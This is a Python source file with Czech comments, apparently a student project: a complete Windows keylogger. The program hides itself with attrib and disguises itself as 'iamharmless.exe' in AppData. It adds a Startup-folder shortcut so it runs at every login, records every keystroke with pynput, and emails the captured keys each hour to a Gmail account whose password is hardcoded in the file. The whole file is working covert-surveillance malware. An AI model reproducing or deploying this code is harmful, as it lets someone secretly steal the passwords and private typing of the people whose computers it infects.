from pynput.keyboard import Listener   #pro odecitani klaves
from datetime import datetime
import smtplib      #pro odesilani mailu
from email.mime.multipart import MIMEMultipart  #pro format emailu
from email.mime.text import MIMEText
from os import system, path     #pro skryti programu a pro ziskani cesty k souboru
import sys  #pro ziskani cesty k exe souboru
from shutil import move     #pro presun programu
from win32com.client import Dispatch    #pro vytvoreni zastupce
from getpass import getuser     #pro ziskani uzivatelskeho jmena prihlaseneho uzivatele
from threading import Timer     #pro dalsi vlakno pro casovac pro odesilani mailu

log_file = "klog.txt"    #nazev souboru pro ukladani klaves    
file_path = "D:\\Škola\\UNOB\\7. semestr\\Vývoj a správa IS\\Python\\ProjektKeylogger\\"  #cesta k souboru pro ukladani klaves

username = getuser()    #ziskani uzivatelskeho jmena prihlaseneho uzivatele
destination_path = f"C:\\Users\\{username}\\AppData\\"  #cesta do slozky pro ulozeni odchytavace
program_name = "iamharmless.exe"
shortcut_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"    #cesta do slozky Po spusteni
shortcut_name = "harmless.lnk"

#udaje k emailu pro odesilani odchycenych klaves
sender = "odchytavacklaves@gmail.com"
password = "odchytavacklaves123"
receiver = "odchytavacklaves@gmail.com"

keys = []   #prazdne pole klaves


def hideProgram():
    #funkce pro samostatny presun a skryti programu
    #current_destination = path.abspath(__file__)     #cesta ke skriptu
    current_destination = path.abspath(sys.argv[0])     #cesta k exe souboru
    system("attrib +h " + f"{current_destination}")  #skryti programu
    if not path.exists(shortcut_path + shortcut_name):  #kontrola, ze zastupce jeste nebyl vytvoren
        createHideShortcut()   
    if not path.exists(destination_path + program_name):    #kontrola, ze odchytavac jeste neni na svem miste - presune se pouze jednou
        move(current_destination,destination_path + program_name)     #presun program  
        
def createHideShortcut():
    #funkce pro vytvoreni a premisteni zastupce 
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(destination_path + shortcut_name)
    shortcut.Targetpath = (destination_path + program_name)
    shortcut.save()
    #system("attrib +h " + f"{destination_path + shortcut_name}")  #skryti zastupce 
    move(destination_path + shortcut_name,shortcut_path + shortcut_name)     #presun zastupce

def press(key):
    #funkce slouzi pro odchytavani stisknutych klaves
    global keys
    print(key)      #vypis klavesu do konzole
    key = format(key) 
    keys.append(key)    #pripoj stisknutou klavesu do pole klaves

def format(key):
    """Funkce formatuje stisknute klavesy do citelnejsi podoby

    Args:
        key (Any): stisknuta klavesa
    
    Returns:
        str: return naformatovanou klavesu
    """
    formatted_key = ""
    #prirazeni specifickych hodnot urcitym klavesam
    keywords = {
        "space":" ",
        "backspace":"[Backspace]",
        "caps":"[CAPS LOCK]",
        "enter":"\n"
    }
    k = str(key).replace("'","")   #vymazani uvozovek
    for keyword in keywords:    
        if k.find(keyword) > 0:     #pokud se objevi vyse specifikovana klavesa, nahradi se danym znakem
            formatted_key = keywords[keyword]
    if (k.find("Key") and k.find("\\x")) == -1:   #nezapisovat funkcni klavesy
        try:
            #reseni pro numerickou klavesnici
            k = int(k.lstrip("<").rstrip(">"))  #odstraneni znaku <> pri stisknuti cisla na numericke klavesnici - ziskani kodu klavesy
            if (k > 95 and k < 106):    #v tomhle rozmezi se nachazeji kody klaves numericke klavesnice
                formatted_key = chr(k-48)   #posun kodu z numericke klavesnici na odpovidajici hodnotu v ASCII a prevod
            elif k == 110:    #znak '.' jediny pri posunu kodu neodpovida
                formatted_key = "."
            else:
                formatted_key = k
        except:
            formatted_key = k
    return str(formatted_key)

def write(formatted_keys):
    #tuto funkci nevyuzivam, ale muze se hodit
    #funkce pro zapis naformatovanych klaves do textoveho souboru
    with open(file_path + log_file, "a") as file:
        for key in formatted_keys:
            file.write(str(key))

def mail(formatted_keys, formatted_now):
    """Funkce pro odesilani emailu s odchycenymi klavesami
	
	Args:
		formatted_keys (list): naformatovane stisknute klavesy
        formatted_now (str): naformatovane datum a cas odeslani
	"""
    message = MIMEMultipart()
    message['From'] = sender    #adresa odesilatele
    message['To'] = receiver    #adresa prijemce
    message['Subject'] = f"Klog {formatted_now}"   #predmet emailu
    body=''.join(formatted_keys)    #pripojim odchycene klavesy
    message.attach(MIMEText(body, 'plain'))
    smtp = smtplib.SMTP('smtp.gmail.com', 587)  #pripojeni pomoci SMTP
    smtp.starttls()     #spusteni TLS pro prihlaseni
    smtp.login(sender, password)    #prihlaseni k emailu
    text = message.as_string()     #celou zpravu prevedu na string
    smtp.sendmail(sender, receiver, text)   #odeslani emailu
    smtp.quit() #ukonceni relace

def release(key):
    #tuto funkci nevyuzivam, ale muze se hodit
    #funkce umoznuje nastavit vypnuti odchytavace pri stisknuti urcite klavesy
    None
#     #pri stisku Esc se vypne odchytavac
#     if key == Key.esc:
#         return False

def measureTime():
    #funkce meri cas a v danem intervalu vola funkci pro odeslani emailu
    global keys
    send_time = 3600     #interval pro odeslani emailu (43200 s = 12 h)
    now = datetime.now()    #ziska soucasne datum a cas
    formatted_now = now.strftime("%d. %m. %Y %H:%M:%S")     #lepsi format pro datum a cas
    mail(keys, formatted_now)   #odesle mail
    #write(keys)    #zapise do souboru
    keys = []
    send_email = Timer(interval = send_time, function = measureTime)  #casovac pro odeslani mailu jednou za dany cas
    send_email.daemon = True    #nastavim vlakno casovace jako daemon -> zastavi se spolu s hlavnim vlaknem
    send_email.start()

def listen():
    #funkce pro odchytavani klavesy pri stisku a pri pusteni
    with Listener(on_press = press, on_release = release) as listener:
        listener.join()

if __name__ == "__main__":
    hideProgram()
    measureTime()
    listen()
    